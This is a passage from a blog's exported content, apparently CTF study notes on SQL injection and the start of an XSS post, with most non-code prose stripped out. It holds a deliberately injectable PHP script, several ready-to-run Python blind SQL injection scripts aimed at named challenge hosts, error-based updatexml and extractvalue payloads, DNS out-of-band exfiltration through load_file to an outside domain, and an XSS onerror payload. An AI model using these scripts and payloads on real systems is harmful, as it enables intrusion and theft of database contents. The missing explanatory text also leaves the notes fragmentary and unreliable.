class=\"line\">$ip &#x3D; &#39;&#39;;</span><br><span class=\"line\">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class=\"line\">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;ip</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;</span><br><span class=\"line\">return $ip_arr[0]; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$host&#x3D;&quot;localhost&quot;;</span><br><span class=\"line\">$user&#x3D;&quot;&quot;;</span><br><span class=\"line\">$pass&#x3D;&quot;&quot;;</span><br><span class=\"line\">$db&#x3D;&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$ip &#x3D; getIp();</span><br><span class=\"line\">echo &#39;your ip is :&#39;.$ip;</span><br><span class=\"line\">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class=\"line\">mysql_query($sql);</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<ul>\n<li><code>insert...into</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class=\"line\">&#x2F;&#x2F;sleep()</span><br><span class=\"line\">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class=\"line\">&#x2F;&#x2F;id&#x3D;1,name&#x3D;null</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong><code>if(a,b,c)</code><code>case...when...then</code><code>substr([str],[start],[len])</code><code>substr([str]from [strat] for [len])</code></strong></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">case...when...then</span><br><span class=\"line\">case</span><br><span class=\"line\">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class=\"line\">\t\t\t\twhen &#39;2&#39; then &#39;nv&#39;</span><br><span class=\"line\">\t\t\t\telse &#39;qita&#39; end</span><br><span class=\"line\">case</span><br><span class=\"line\">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class=\"line\">\t\t when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class=\"line\">\t\t else &#39;qita&#39; end</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class=\"line\">&#x2F;&#x2F;) #</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">allString = <span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\"></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\">url = <span class=\"string\">\"http://123.206.87.240:8002/web15/\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> allString:</span><br><span class=\"line\">        payload = <span class=\"string\">\"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">        headers = &#123;<span class=\"string\">'x-forwarded-for'</span>:payload&#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(url = url,headers = headers,timeout = <span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> requests.exceptions.ReadTimeout:</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">print(<span class=\"string\">\"flag is :&#123;\"</span> +flag+<span class=\"string\">\"&#125;\"</span>)</span><br><span class=\"line\">//</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">web15</span><br><span class=\"line\">//</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">client_ip,flag</span><br><span class=\"line\">//</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br><span class=\"line\">flag</span><br><span class=\"line\">//flag</span><br><span class=\"line\">payload = <span class=\"string\">\"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\"</span>.format(i,j)</span><br></pre></td></tr></table></figure>\n<p>flag</p>\n<blockquote>\n<p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p>\n</blockquote>\n<h3 id=\"mid\"><a href=\"#mid\" class=\"headerlink\" title=\"mid\"></a>mid</h3><p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1^1&#x3D;01^0&#x3D;10^1&#x3D;10^0&#x3D;0</span><br><span class=\"line\">?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class=\"line\">(There is nothing.)(length(&#39;and&#39;)&#x3D;0);</span><br><span class=\"line\">(Error,Error,Error!)(length(&#39;and&#39;)&#x3D;0)</span><br><span class=\"line\"></span><br><span class=\"line\">?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+Error,Error,Error!(length(&#39;and&#39;)&#x3D;0)and</span><br><span class=\"line\">orselectunion</span><br><span class=\"line\">selselectect</span><br><span class=\"line\">uniunionon</span><br></pre></td></tr></table></figure>\n<p>informationor</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">data &#x3D; &#39;&#39;</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span class=\"line\">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class=\"line\">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class=\"line\">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class=\"line\">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class=\"line\">        if &#39;Nobody&#39; not in r.text:</span><br><span class=\"line\">            data +&#x3D; j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(data)</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>selectmysql</p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png\" alt=\"image-20200816164858101\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure>\n<h3 id=\"ctfhubif\"><a href=\"#ctfhubif\" class=\"headerlink\" title=\"ctfhubif\"></a>ctfhubif</h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(a,b,c) abc</span><br></pre></td></tr></table></figure>\n<p>id=1,23b=12c3</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">flag &#x3D; &#39;&#39;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span class=\"line\">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class=\"line\">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class=\"line\">        if &#39;query_success&#39; in r.text:</span><br><span class=\"line\">            flag +&#x3D;j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">#</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class=\"line\">#</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class=\"line\">#flag</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>1-3030-50</p>\n<h3 id=\"ctfhubif\"><a href=\"#ctfhubif\" class=\"headerlink\" title=\"ctfhubif\"></a>ctfhubif</h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class=\"line\">url &#x3D; &#39;&#39;</span><br><span class=\"line\">flag &#x3D; &#39;&#39;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">for i in range(0,50):</span><br><span class=\"line\">    for j in dic:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class=\"line\">        except requests.exceptions.ReadTimeout:</span><br><span class=\"line\">            flag +&#x3D;j</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">#</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">#</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class=\"line\">#flag</span><br><span class=\"line\">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-SQL\"><a href=\"#3-SQL\" class=\"headerlink\" title=\"3.SQL\"></a>3.SQL</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">' and updataxml(1,concat(0x7e,(<span class=\"keyword\">select</span> <span class=\"keyword\">user</span>()),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) <span class=\"comment\">--+   //</span></span><br><span class=\"line\"><span class=\"string\">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"keyword\">and</span> updataxml(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>)<span class=\"comment\">--+    //</span></span><br><span class=\"line\"><span class=\"string\">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class=\"keyword\">test</span> <span class=\"string\">' limit 0,1),0x7e),1) --+     //</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"keyword\">and</span> updatexml(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> column_name <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">'my student'</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0x7e</span>),<span class=\"number\">1</span>) <span class=\"comment\">--+   //</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h2><h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><strong>WebSQLSQL</strong></p>\n<ul>\n<li><p><br></p>\n</li>\n<li><p><br></p>\n</li>\n</ul>\n<h2 id=\"5-DNS\"><a href=\"#5-DNS\" class=\"headerlink\" title=\"5.DNS\"></a>5.DNS</h2><h3 id=\"0x01DNS\"><a href=\"#0x01DNS\" class=\"headerlink\" title=\"0x01DNS\"></a>0x01DNS</h3><p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png\" alt=\"image-20200609202338069\"></p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png\" alt=\"image-20200609203639074\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;</span><br><span class=\"line\">select load_file(&quot;\\\\\\\\xxx.php90.cn\\\\ccc&quot;)      &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;xxx.php90.cn\\\\cc&quot;));</span><br><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\\\cc&quot;));</span><br><span class=\"line\">select load_file(concat(&quot;\\\\\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\\\cc&quot;));</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-\"><a href=\"#6-\" class=\"headerlink\" title=\"6.\"></a>6.</h2><p><a href=\"https://xz.aliyun.com/t/253\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/253</a></p>\n<p>union</p>\n<p><code>xpath</code><code>concat+rand()+group_by()</code></p>\n<h3 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h3><p>xpath<code>extractvalue</code><code>updatexml</code><br>mysql&gt;5.1.5</p>\n<p><strong>extractvalue</strong></p>\n<blockquote>\n<p>extractvalue(xml_document,Xpath_string)<br>extractvalue(xml_document,Xpath_string);<br>xml_documentstringxml<br>Xpath_stringxpath<br>xml</p>\n</blockquote>\n<p>xpath</p>\n<p>pyload<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select))))</code></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>mysql</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class=\"line\">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class=\"line\">1234</span><br></pre></td></tr></table></figure>\n<p></p>\n<ul>\n<li> 0x7e=~</li>\n<li> concat(a,b)=ab</li>\n<li> version()=@@version</li>\n<li> ~#$xpath</li>\n<li> extractvalue()3232substring()limit32</li>\n</ul>\n<p><strong>updatexml</strong></p>\n<blockquote>\n<p>updatexml(xml_document,xpath_string,new_value)<br>updatexml(xml_document,xpath_string,new_value)<br>xml_documentstringxml xpath_stringxpath<br>new_valuestring </p>\n</blockquote>\n<p>extractvalue<br>payload<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select())),&quot;anything&quot;))</code></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class=\"line\">12</span><br></pre></td></tr></table></figure>\n<p>mysql</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class=\"line\">&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure>\n<h3 id=\"concat-rand-group-by-\"><a href=\"#concat-rand-group-by-\" class=\"headerlink\" title=\"concat+rand()+group_by()\"></a>concat+rand()+group_by()</h3><p>floor(rand(0)*2)group bygroup by keykeykeykeykey</p>\n<p><strong>rand()</strong></p>\n<blockquote>\n<p>0~1rand()</p>\n</blockquote>\n<p><strong>floor()</strong></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p><code>floor(rand(0))*2</code> ,01</p>\n<p><strong>group by</strong></p>\n<blockquote>\n<p>group bysql<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p>\n</blockquote>\n<p><strong>rand(),.</strong></p>\n<p>floor(rand(0)<em>2) <em>*0110110</em></em></p>\n<p><strong>group by x,.</strong>,rand(),0,,rand(),</p>\n<p><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png\" alt=\"img\"></a></p>\n<p>,rand()1,,1,</p>\n<p><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png\" alt=\"img\"></a></p>\n<p>rand()0,,<strong>rand(),1.1</strong></p>\n<p><strong>key, key.key,keyroot@localhost</strong></p>\n<p><strong>,</strong></p>\n<p><strong><a href=\"https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png\" target=\"_blank\" rel=\"noopener\"><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png\" alt=\"img\"></a></strong></p>\n<p>,rand(),floor() group by .</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#payload</span><br><span class=\"line\">1 Union select count(*),concat((),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure>\n<p>ctfhub</p>\n<h3 id=\"ctfhub\"><a href=\"#ctfhub\" class=\"headerlink\" title=\"ctfhub\"></a>ctfhub</h3><p></p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png\" alt=\"image-20200817145102761\"></p>\n<p>flag</p>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png\" alt=\"image-20200817145552296\"></p>\n","categories":["web"],"tags":["web"]},{"title":"xss","url":"https://pz1o.top/2020/12/09/xss/","content":"<p></p>\n<h1 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>htmlphpphp</p>\n<p>phphtml</p>\n<p>htmlphp</p>\n<h3 id=\"jscookie\"><a href=\"#jscookie\" class=\"headerlink\" title=\"jscookie\"></a>jscookie</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01xss\"><a href=\"#0x01xss\" class=\"headerlink\" title=\"0x01xss\"></a>0x01xss</h2><p>xssxssxss</p>\n<p>xss</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02xss\"><a href=\"#0x02xss\" class=\"headerlink\" title=\"0x02xss\"></a>0x02xss</h2><p>urlxssurlxssxssurlxss</p>\n<p>url</p>\n<p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td 